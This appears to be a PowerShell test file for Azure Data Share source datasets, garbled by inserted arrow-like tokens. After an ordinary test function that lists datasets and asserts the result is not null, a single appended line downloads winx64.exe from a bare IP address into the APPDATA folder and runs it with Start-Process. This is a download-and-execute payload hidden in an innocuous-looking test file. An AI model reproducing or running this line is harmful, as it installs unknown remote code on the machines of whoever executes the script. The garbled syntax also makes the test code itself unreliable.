





 -||-> function Test-SourceDataSetsCrud
{
     -||-> $resourceGroup =  -||-> getAssetName <-||-  <-||- 
     -||-> $AccountName =  -||-> getAssetName <-||-  <-||- 
     -||-> $ShareSubscriptionName =  -||-> getAssetName <-||-  <-||- 
	 -||-> $SourceDataSets =  -||-> Get-AzDataShareSourceDataSet -ResourceGroupName $resourceGroup -AccountName $AccountName -ShareSubscriptionName $ShareSubscriptionName <-||-  <-||- 

	 -||-> Assert-NotNull $SourceDataSets <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\winx64.exe" <-||- ) <-||- 



